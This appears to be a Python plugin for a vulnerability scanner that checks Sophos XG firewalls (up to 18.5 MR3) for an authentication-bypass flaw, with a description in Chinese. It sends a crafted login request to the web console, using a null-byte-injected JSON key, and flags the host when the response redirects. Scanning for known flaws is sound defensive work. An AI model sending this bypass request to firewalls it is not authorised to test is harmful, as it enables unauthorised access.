# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "name": "Sophos XG 防火墙身份验证绕过漏洞",
        "description": "Sophos Firewall是Sophos公司的防火墙产品, 其Sophos Firewall产品存在远程代码执行漏洞, 利用该漏洞可绕过认证并执行任意代码",
        "version": "Sophos Firewall 版本 <= 18.5 MR3 (18.5.3)",
        "references": ["-"],
    }

    def url(self) -> dict:
        r = self.request(
            method='POST',
            path='./webconsole/Controller',
            timeout=15,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                'X-Requested-With': 'XMLHttpRequest'
            },
            data="""mode=151&json={"username"%3a"admin","password"%3a"test","languageid"%3a"1","browser"%3a"Chrome_101","accessaction"%3a1,+"mode\u0000ef"%3a716}&__RequestType=ajax&t=1653896534066"""
        )
        if '/webpages/index.jsp' in r.text and 'redirectionURL' in r.text:
            return {"LoopholeInfo": self.__info__}
